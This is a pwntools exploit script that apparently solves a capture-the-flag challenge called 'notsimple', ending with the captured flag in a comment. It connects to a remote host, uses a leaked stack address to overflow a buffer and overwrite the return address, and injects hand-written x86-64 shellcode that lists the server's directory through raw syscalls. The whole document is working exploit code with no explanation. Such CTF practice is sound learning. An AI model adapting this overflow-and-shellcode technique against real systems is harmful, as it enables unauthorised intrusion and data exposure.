
from pwn import *

context.arch = 'amd64'

# r = process('./notsimple')
r = remote('193.57.159.27',37284)

leak = int(r.recvuntil(b'> ').split()[3], 16) + 0x58 + 8

p = b'A' * 88
p += p64(leak)

code = f"""
[bits 64]

	xor rax, rax
	push rax
	push  byte '.'

	;; sys_open(".", 0, 0)
	mov al, 2      
	mov rdi, rsp   
	xor rsi, rsi 
	xor rdx, rdx 
	syscall	

	;;  getdents(fd,esp,0x3210)
	mov rdi,rax 		
	xor rdx,rdx
	xor rax,rax
	mov dx, 0x3210 	
	sub rsp, rdx 	
	mov rsi, rsp 	
	mov al, 78 	
	syscall

	xchg rax,rdx

	;; write(1, rsp, rdx)
	xor rax, rax
	xor rdi,rdi
	
	inc eax
	inc edi
	mov rsi, rsp
	syscall

	xor rax, rax
	mov al, 60
	syscall
"""

with open('code.nasm', 'w') as f:
    f.write(code)

f.close()

process(['nasm', 'code.nasm'])
sleep(1)

with open('code', 'rb') as f:
    p += f.read()

r.sendline(p)

print(r.recv())

# rarctf{h3y_wh4ts_th3_r3dpwn_4bs0rpti0n_pl4n_d01n6_h3r3?_4cc9581515}